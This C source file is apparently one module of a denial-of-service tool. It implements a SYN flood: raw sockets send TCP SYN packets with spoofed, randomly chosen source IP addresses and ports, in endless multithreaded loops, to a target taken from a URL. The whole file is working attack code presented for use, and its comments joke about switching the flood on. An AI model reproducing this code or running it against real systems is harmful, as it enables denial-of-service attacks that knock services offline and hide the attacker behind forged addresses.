#include <stdio.h>
// For memset
#include <string.h>
#include <sys/socket.h>
// For exit(0);
#include <stdlib.h>
// For errno - the error number
#include <errno.h>
// Provides declarations for tcp header
#include <netinet/tcp.h>
// Provides declarations for ip header
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/types.h>
#include <signal.h>

#include "syn_flood_dos.h"
#include "main.h"

// from ../core/core_log.c
extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
extern int DisplayInfo(const char *fmt, ...);
extern int DisplayWarning(const char *fmtsring, ...);
extern int DisplayError(const char *fmt, ...);

extern unsigned short CalculateSum(unsigned short *ptr, int nbytes);

extern void FreeSplitURLBuff(pSplitURLOutput p);
extern pSplitURLOutput SplitURL(const char *url, pSplitURLOutput *output);
extern void FreeRandomIPBuff(char *p);
extern char *GetRandomIP(char **output);
extern size_t GetRandomPort(size_t *output);
extern void SignalExit(int signo);

//int attack(const struct AHTTP_INPUT *ainput)
static int SendSYN(const pSYNStruct ss, const int debug_level)
{
    // start attack now
    // create a raw socke
    // the program must run as root
    int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (socket_fd < 0)
    {
        DisplayError("Create socket failed: %s(%d)", strerror(errno), errno);
        if (errno == 1)
        {
            DisplayWarning("This program should run as root user");
        }
        else if (errno == 24)
        {
            DisplayWarning("You shoud check max file number use 'ulimit -n' in linux");
            DisplayWarning("And change the max file number use 'ulimit -n <setting number>'");
            DisplayWarning("Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time");
        }
        return 1;
    }
    int i;
    // datagram to represent the packet
    char datagram[4096];
    //IP header
    struct iphdr *iph = (struct iphdr *)datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    //strcpy(source_ip, "192.168.1.1");
    sin.sin_family = AF_INET;
    sin.sin_port = htons((int)ss->dst_port);
    //sin.sin_port = htons(80);
    // target
    sin.sin_addr.s_addr = inet_addr(ss->dst_ip);
    //sin.sin_addr.s_addr = inet_addr("1.2.3.4");

    // Zero out the buffer
    //memset(datagram, 0, 4096);
    if (!memset(datagram, 0, 4096))
    {
        DisplayError("Attack memset failed");
        return 1;
    }

    // fill in the IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    // id of this packet
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    // set to 0 before calculating checksum
    iph->check = 0;
    // spoof the source ip address
    iph->saddr = inet_addr(ss->src_ip);
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = CalculateSum((unsigned short *)datagram, iph->tot_len >> 1);

    // TCP Header
    tcph->source = htons((int)ss->src_port);
    //tcph->source = htons(3306);
    //tcph->source = htons(1234);
    tcph->dest = htons((int)ss->dst_port);
    //tcph->dest = htons(80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    // First and only tcp segment
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    // maximum allowed window size
    tcph->window = htons(5840);
    // if you set a checksum to zero, your kernel's IP stack
    // should fill in the correct checksum during transmission
    tcph->check = 0;

    tcph->urg_ptr = 0;
    // Now the IP checksum

    psh.source_address = inet_addr(ss->src_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    if (!memcpy(&psh.tcp, tcph, sizeof(struct tcphdr)))
    {
        DisplayError("Attack memcpy failed");
        return 1;
    }

    tcph->check = CalculateSum((unsigned short *)&psh, sizeof(struct pseudo_header));

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        DisplayError("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
        //exit(0);
        return 1;
    }

    int flag = 1;
    int len = sizeof(int);
    if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
    {
        DisplayError("Error setting SO_REUSEADDR: %s(%d)", strerror(errno), errno);
        //exit(0);
        return 1;
    }

    // Uncommend the loop if you want to flood :)
    //while (1)
    //{
    //Send the packet
    for (i = 0; i < ss->each_ip_repeat; i++)
    {
        //int l;
        if (sendto(
                socket_fd,               // our socket
                datagram,                // the buffer containing headers and data
                iph->tot_len,            // total length of our datagram
                0,                       // routing flags, normally always 0
                (struct sockaddr *)&sin, // socket addr, just like in
                sizeof(sin)) < 0)        // a normal send()
        {
            DisplayError("Attack send failed");
            //break;
        }
        // Data send successfull
        /*
        else
        {
            debug(debug_level, 2, "Attack packet end successful");
        }
        */
    }
    close(socket_fd);

    return 0;
}

static void FreeSYNStructBuff(pSYNStruct input)
{
    // free the structure
    if (input)
    {
        if (input->dst_ip)
        {
            free(input->dst_ip);
        }
        free(input);
    }
}

static int AttackThread(pInput input)
{
    // now we start the syn flood attack

    pSYNStruct syn_struct = (pSYNStruct)malloc(sizeof(SYNStruct));
    pSplitURLOutput split_result;
    int i;

    if (!SplitURL(input->address, &split_result))
    {
        DisplayError("AttackThread SplitURL failed");
        return 1;
    }
    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->protocol);
    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->host);
    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %d", split_result->port);
    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->suffix);
    if (split_result->port == 0)
    {
        if (strlen(split_result->host) == 0)
        {
            DisplayError("AttackThread SplitURL not right");
            return 1;
        }
        // make the port as default
        split_result->port = SYN_FLOOD_PORT_DEFAULT;
    }
    // init the target ip and port
    syn_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
    if (!(syn_struct->dst_ip))
    {
        DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!memset(syn_struct->dst_ip, 0, IP_BUFFER_SIZE))
    {
        DisplayError("AttackThread memset failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!strncpy(syn_struct->dst_ip, split_result->host, strlen(split_result->host)))
    {
        DisplayError("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    syn_struct->dst_port = split_result->port;
    FreeSplitURLBuff(split_result);
    syn_struct->each_ip_repeat = input->each_ip_repeat;

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "AttackThread start sending data...");
    for (;;)
    {
        // here get the random ip address and port
        if (input->random_sip_address == ENABLE_SIP)
        {
            if (!GetRandomIP(&(syn_struct->src_ip)))
            {
                DisplayError("AttackThread GetRandomIP failed");
                return 1;
            }
            // this function has no failed
            GetRandomPort(&(syn_struct->src_port));
        }
        // here we will use the default ip address and port
        else
        {
            if (!strncpy(syn_struct->src_ip, DEFAULT_ADDRESS, strlen(DEFAULT_ADDRESS)))
            {
                DisplayError("AttackThread copy SIP_ADDRESS failed: %s(%d)", strerror(errno), errno);
                return 1;
            }
            syn_struct->src_port = (int)DEFAULT_PORT;
        }

        // rport is random source port
        for (i = 0; i < input->each_ip_repeat; i++)
        {
            if (SendSYN(syn_struct, input->debug_level))
            {
                DisplayError("AttackThread Attack failed");
                //return 1;
            }
        }
        FreeRandomIPBuff(syn_struct->src_ip);
    }
    FreeSYNStructBuff(syn_struct);
    return 0;
}

int StartSYNFloodAttack(const pInput input)
{
    // run function in thread
    // this attack type must run as root

    pthread_t tid[input->max_thread];
    pthread_attr_t attr;
    int j, ret;

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFloodAttack");
    signal(SIGINT, SignalExit);
    // unlimit loop
    for (;;)
    {
        // only one process
        for (j = 0; j < input->max_thread; j++)
        {
            //input->serial_num = (i * input->max_thread) + j;
            if (pthread_attr_init(&attr))
            {
                DisplayError("StartSYNFloodAttack pthread_attr_init failed");
                return 1;
            }
            //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
            if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
            {
                DisplayError("StartSYNFloodAttack pthread_attr_setdetachstate failed");
                return 1;
            }
            // create thread
            ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
            //printf("j is: %d\n", j);
            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
            // here we make a map
            if (ret != 0)
            {
                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
                DisplayError("Create pthread failed");
                return 1;
            }
            pthread_attr_destroy(&attr);
        }
        //pthread_detach(tid);
        // join them all
        for (j = 0; j < input->max_thread; j++)
        {
            pthread_join(tid[j], NULL);
        }
    }
    return 0;
}

int StartSYNFloodTest(const pInput input)
{
    // run function in thread
    // this attack type must run as root
    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFloodTest");
    AttackThread(input);
    return 0;
}

/*
int main(void)
{
    // for test
    pInput p = (pInput)malloc(sizeof(Input));
    p->random_sip_address = ENABLE_SIP;
    p->each_ip_repeat = 1024;
    strcpy(p->address, "192.168.1.1:80");
    SYNFloodAttack_Thread(p);
    return 0;
}
*/